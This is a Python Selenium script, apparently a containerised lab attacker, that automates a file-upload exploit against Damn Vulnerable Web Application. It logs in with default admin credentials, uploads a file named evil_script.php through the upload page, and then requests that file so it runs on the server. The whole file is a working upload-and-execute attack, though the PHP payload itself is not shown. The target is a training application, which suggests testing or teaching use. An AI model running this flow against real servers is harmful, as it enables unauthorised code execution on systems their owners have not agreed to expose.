import argparse
import sys
import time

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from pyvirtualdisplay import Display

def file_upload():
    """
    executes the evil upload to damn vulnerable web application
    """
    # Login
    url = 'http://' + args.server_ip + '/login.php'
    browser.get(url)
    browser.find_element_by_name('username').send_keys('admin')
    browser.find_element_by_name('password').send_keys('password')
    browser.find_element_by_name('Login').click()
    print('Login --> ' + url)

    # File upload
    url = 'http://' + args.server_ip + '/vulnerabilities/upload/'
    browser.get(url)
    fileinput = browser.find_element_by_name('uploaded')
    fileinput.send_keys('/home/evil_script.php')
    browser.find_element_by_name('Upload').click()
    print('Upload file --> ' + url)

    # Execute evil file
    url = 'http://' + args.server_ip + '/hackable/uploads/evil_script.php'
    print('Execute file --> ' + url)
    browser.get(url)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='File upload exploit container.')

    parser.add_argument('-ip', dest='server_ip', action='store', type=str, required=True,
                        help='The IP address of the target server')
    args = parser.parse_args()

    # Virtual display to run browser
    display = Display(visible=False, size=(800, 800))
    display.start()

    # Headless chrome-browser settings
    chrome_options = Options()
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument('--ignore-certificate-errors')
    browser = webdriver.Chrome(chrome_options=chrome_options)

    # execute exploit once after stdin line, then sleep to keep container alive
    executed = False
    while True:
        sys.stdin.readline()
        if not executed:
            file_upload()
            executed = True
        else:
            time.sleep(5)
